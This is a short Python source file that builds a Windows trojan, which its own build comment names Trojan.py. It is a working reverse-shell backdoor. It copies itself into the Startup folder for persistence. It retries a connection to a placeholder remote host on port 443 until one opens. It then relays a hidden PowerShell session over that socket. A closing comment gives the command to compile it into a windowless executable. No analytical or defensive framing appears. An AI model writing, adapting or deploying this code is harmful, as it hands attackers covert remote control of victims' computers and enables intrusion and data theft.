import socket
import subprocess
import threading
import os

def autorun():
    filename = os.path.basename(__file__)
    exe_filename = filename.replace(".py", ".exe")
    os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(exe_filename))

autorun()
while True:
    def inte(client, proc):
        while True:
            proc.stdin.write(client.recv(1024).decode())
            proc.stdin.flush()

    def output(client, proc):
        while True:
            client.send(proc.stdout.read(1).encode())

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            client.connect(("0.0.0.1", 443)) ### change this ##
            break
        except:
            pass
    proc = subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
    threading.Thread(target=inte, args=[client, proc], daemon=True).start()
    threading.Thread(target=output, args=[client, proc], daemon=True).start()
### use pyinstaller -F --clean -w(no windown) Trojan.py  ###
